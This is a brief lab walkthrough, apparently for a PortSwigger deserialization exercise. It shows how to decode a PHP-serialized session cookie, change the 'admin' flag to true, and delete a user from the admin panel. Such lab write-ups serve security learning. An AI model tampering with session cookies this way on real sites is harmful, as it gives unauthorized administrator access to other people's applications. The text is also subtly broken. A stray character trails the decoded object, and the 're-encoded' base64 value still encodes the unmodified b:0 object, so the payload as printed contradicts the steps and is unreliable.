# [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

> change the session token that contain admin privileges

- open the page in a browser
- log in with `wiener:peter`
- check the session cookie
- it should be something like this:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

- translate it from `base64`:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}7
```

> the `"admin";b:0` part is the interesting

- it means the `admin` prop type `bool` and its value `false`
- change it to:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}7
```

- translate it back to `base64`

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO303
```

- change the cookie session to that
- reload the page
- go to the admin panel
- delete carlos
